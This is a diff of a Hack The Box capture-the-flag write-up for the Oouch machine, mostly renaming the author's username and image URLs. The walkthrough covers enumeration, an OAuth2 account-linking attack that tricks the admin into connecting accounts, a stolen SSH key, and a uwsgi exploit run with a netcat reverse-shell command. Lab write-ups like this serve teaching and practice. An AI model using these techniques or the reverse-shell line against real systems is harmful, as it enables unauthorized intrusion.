@@ -9,6 +9,7 @@ avatar: assets/htb/oouch.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Oouch
 ---
+
 ## Overview
 
 This had difficulty Linux machine taught me a lot about the internal workings of a federated access control system, specifically an implementation of Oauth2.  Persistence and the ability to take error messages and learn from them were necessary to progress through this machine.
@@ -20,7 +21,7 @@ This had difficulty Linux machine taught me a lot about the internal workings of
 First off, I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` which saves the output with a filename of `<name>`.
 
 ```bash
-zweilos@kalimaa:~/htb/oouch$ nmap -p- -sC -sV -oA oouch <YOUR_IP>
+kac0@kalimaa:~/htb/oouch$ nmap -p- -sC -sV -oA oouch <YOUR_IP>
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 14:10 EDT
 WARNING: Service <YOUR_IP>:8000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
@@ -97,11 +98,11 @@ Nmap done: 1 IP address (1 host up) scanned in 2390.62 seconds
 When doing my initial reconnaissance, I prefer to test for anonymous access to remote access and file sharing services such as ftp, telnet, and SMB before tacking more time and resource intensive services.  In this case since port 21 was open, my first step was to login to FTP as `anonymous`.  
 
 ```http
-zweilos@kalimaa:~/htb/oouch$ ftp <YOUR_IP>
+kac0@kalimaa:~/htb/oouch$ ftp <YOUR_IP>
 
 Connected to <YOUR_IP>. 
 220 qtc's development server 
-Name (<YOUR_IP>:zweilos): anonymous 
+Name (<YOUR_IP>:kac0): anonymous 
 230 Login successful.    
 Remote system type is UNIX. 
 Using binary mode to transfer files.
@@ -131,7 +132,7 @@ ftp> quit
 There was only one file, `project.txt` on the server, and I couldn't navigate anywhere else.
 
 ```text
-zweilos@kalimaa:~/htb/oouch$ cat project.txt
+kac0@kalimaa:~/htb/oouch$ cat project.txt
 Flask -> Consumer
 Django -> Authorization Server
 ```
@@ -141,33 +142,33 @@ The contents of the file revealed that `Flask` and `Django` were the two types o
 Next I checked SSH, but it did not allow me to connect without a private key _\(I did note that there is no password required though\)_.
 
 ```text
-zweilos@kalimaa:~/htb/oouch$ ssh <YOUR_IP>
-zweilos@<YOUR_IP>: Permission denied (publickey).
+kac0@kalimaa:~/htb/oouch$ ssh <YOUR_IP>
+kac0@<YOUR_IP>: Permission denied (publickey).
 ```
 
 ### Website on port 5000
 
 The next open port on my list was 5000.  This is a non-standard port and could have been anything, but Nmap reported that there was an Nginx server hosting an HTTP server there, so I fired up my browser to check it out.  Navigating to `http://<YOUR_IP>:5000` led to a pretty bare-bones login page.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/screenshot_2020-06-09_15-36-13.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/screenshot_2020-06-09_15-36-13.png)
 
 ## Initial Foothold
 
 First, I tested a few common default logins such as 'admin:admin' but that didn't get me anywhere.  From there I went to the `Register` page, created an account, logged in, and started looking around the site. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/Screenshot_2020-06-09_15-38-03.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/Screenshot_2020-06-09_15-38-03.png)
 
 There was not much to do on most of the internal pages, though there was an interesting "send a message to the administrator" type input box on the `/contact` page.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/screenshot_2020-06-09_15-41-13.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/screenshot_2020-06-09_15-41-13.png)
 
 Attempting to check for XSS on the contact page using `javascript:alert(document.cookie)` resulted in: `"Hacking Attempt Detected"` and a one minute IP ban \(see screenshot below\). Sending the word 'JavaScript' was fine...but sending just the word 'alert' also triggered this message...I decided there must be some sort of filter, WAF, or IPS.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/screenshot_2020-06-09_16-04-27.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/screenshot_2020-06-09_16-04-27.png)
 
 Next I used Gobuster to search for more accessible directories and found an `/oauth` page. `http://<YOUR_IP>:5000/oauth` led to a "hidden" page with the following links:
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/screenshot_2020-06-10_10-17-42.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/screenshot_2020-06-10_10-17-42.png)
 
 > * In order to connect your account:`http://consumer.oouch.htb:5000/oauth/connect`
 > * Once your account is connected, login here:`http://consumer.oouch.htb:5000/oauth/login`
@@ -186,7 +187,7 @@ I didn't have any credentials that worked for the authorization site, so I began
 
 ### The Oauth2 server
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/screenshot_2020-06-10_11-16-23.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/screenshot_2020-06-10_11-16-23.png)
 
 I found these sites to be useful while doing research on the Oauth2 protocol:
 
@@ -196,7 +197,7 @@ I found these sites to be useful while doing research on the Oauth2 protocol:
 
 After creating an account and logging in, I was greeted with two API links `/oauth/get_user` and `/oauth/token`.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/screenshot_2020-06-13_07-09-34.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/screenshot_2020-06-13_07-09-34.png)
 
 The two links didn't seem to do anything yet \(according to my research I needed a higher privilege authorization token\).  I needed a way to get this token from a higher privilege user, and the only thing I could think of that I had found related to a site admin was the `/contact` page on the port 5000 site. Since the `/oauth` page had a method labeled "connect", I figured the path forward must involve using oauth2 to link my account to the admin account.  
 
@@ -204,7 +205,7 @@ After a lot of trial and error and lots of reading of the Oath2 documentation I 
 
 In order to exploit this, I first went back to original account on `http://consumer.oouch.htb:5000/` to use the `/connect` link on the `/oauth` page to authorize my two accounts to connect \(the one on the consumer page on port 5000 and the Oauth2 internal account on port 8000\). 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/oouch8.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/oouch8.png)
 
 Using Burp to intercept all browser requests, I allowed each of the requests to pass until got to the button to authorize the connect.  I then clicked the button, allowed the POST to the server in Burp,
 
@@ -248,11 +249,11 @@ DNT: 1
 
 Next, I needed to get the admin to link his account to mine in order to escalate my privileges. I went back to the `http://consumer.oouch.htb:5000/contact` page, and sent the admin the link with my authorization token request link, which was already activated through the POST message earlier. All I needed was for the admin to click the link to connect our accounts. This was an example of an attack called [Server-side Request Forgery \(SSRF\)](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery).
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/oouch13.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/oouch13.png)
 
 I sent the following link to the admin, and hoped that there was some way that they would click it: `http://consumer.oouch.htb:5000/oauth/connect/token?code=4GCuHQ0LTjKkezQmz2jlolgHxfLXbc` _\(copied from the url bar after Burp dropped the `GET` earlier\)._  
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/oouch10.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/oouch10.png)
 
 After getting a message thanking me for my feedback to the admin, I used the link `http://consumer.oouch.htb:5000/oauth/login` from the `/oauth` page to authorize the account connection.
 
@@ -260,7 +261,7 @@ After getting a message thanking me for my feedback to the admin, I used the lin
 Note: You have to log in fast otherwise the token expires!
 {% endhint %}
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/screenshot_2020-06-10_15-42-54.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/screenshot_2020-06-10_15-42-54.png)
 
 The `/profile` page now showed was logged in as the user `qtc` with my oauth2 account linked to it.
 
@@ -278,7 +279,7 @@ I now had some credentials for a `develop` user but I wasn't sure where to use t
 
 I turned to gobuster once again to search for more directories, and found `/oauth/applications/register/` which gave me an HTTP basic authentication login prompt where I used the develop creds from the `/documents` page.  
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/oouch17.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/oouch17.png)
 
 After logging in I was given a page where I could register a new application.  I went back and did some more research on registering web applications and found information for both Django and Flask.  
 
@@ -290,11 +291,11 @@ You can apparently set the authorization link to redirect wherever you want. By 
 
 _I forgot the port on my redirect URL while filling out the request the first time. Luckily there was an edit button!_
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/screenshot_2020-06-11_02-20-00.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/screenshot_2020-06-11_02-20-00.png)
 
 Side note: After creating an app and clicking "Go Back" it prompts for basic authentication with the text “Oouch Admin Only” at URL `http://authorization.oouch.htb:8000/oauth/applications/`. The `develop` creds did not work here.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/oouch20.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/oouch20.png)
 
 My web app registration request looked like this in Burp:
 
@@ -351,7 +352,7 @@ DNT: 1
 I got a connection on my listener!
 
 ```bash
-zweilos@kalimaa:~/htb/oouch$ nc -lvnp 1234 > djangoapp                                                 
+kac0@kalimaa:~/htb/oouch$ nc -lvnp 1234 > djangoapp                                                 
 listening on [any] 1234 ...                                                                            
 connect to [10.10.14.253] from (UNKNOWN) [10.10.14.253] 53300
 ```
@@ -390,7 +391,7 @@ Cookie: sessionid=34w2oj9hyjofej6d4cwr9dykbm5dl9ex;
 
 I now had a session cookie from the admin.  Since I was already logged in as `qtc` on the consumer portal, I used this cookie to see if I could to log into `http://authorization.oouch.htb:8000/` as `qtc` 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/screenshot_2020-06-11_02-51-40.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/screenshot_2020-06-11_02-51-40.png)
 
 It worked! Now that I had a higher privilege oauth2 account, I decided it was time to try out those endpoint links to get an authorization token from `/oauth/token`  to access the API `/oauth/get_user` I saw earlier.
 
@@ -495,9 +496,9 @@ Note: Don't forget to**`chmod 600`** your SSH keys before use!
 ### User.txt
 
 ```bash
-zweilos@kalimaa:~/htb/oouch$ chmod 600 qtc.id_rsa
-zweilos@kalimaa:~/htb/oouch$
-zweilos@kalimaa:~/htb/oouch$ ssh qtc@<YOUR_IP> -i qtc.id_rsa
+kac0@kalimaa:~/htb/oouch$ chmod 600 qtc.id_rsa
+kac0@kalimaa:~/htb/oouch$
+kac0@kalimaa:~/htb/oouch$ ssh qtc@<YOUR_IP> -i qtc.id_rsa
 
 Linux oouch 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64
 
@@ -515,7 +516,7 @@ qtc@oouch:~$ uname -a
 Linux oouch 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux
 
 qtc@oouch:~$ cat user.txt 
-6c92****cd2b
+6c92************************cd2b
 
 qtc@oouch:~$ cat .note.txt 
 Implementing an IPS using DBus and iptables == Genius?
@@ -706,7 +707,7 @@ The `uwsgi` service was running on the `oouch`box, and I also found the `wsgi.in
 I then tried to run the exploit to try to get a reverse shell:
 
 ```bash
-zweilos@kalimaa:~/htb/oouch$ python3 ./uwsgi.py http://<YOUR_IP>:5000 -c " nc -e /bin/sh 10.0.0.1 1234"
+kac0@kalimaa:~/htb/oouch$ python3 ./uwsgi.py http://<YOUR_IP>:5000 -c " nc -e /bin/sh 10.0.0.1 1234"
 usage: uwsgi.py [-h] [-m [{http,tcp,unix}]] -u [UWSGI_ADDR] -c [COMMAND]
 uwsgi.py: error: the following arguments are required: -u/--uwsgi
 ```
@@ -842,5 +843,5 @@ connect to [172.18.0.1] from (UNKNOWN) [<YOUR_IP>] 50776
 root
 oouch
 # cat root.txt
-d63a****f187
+d63a************************f187
 ```
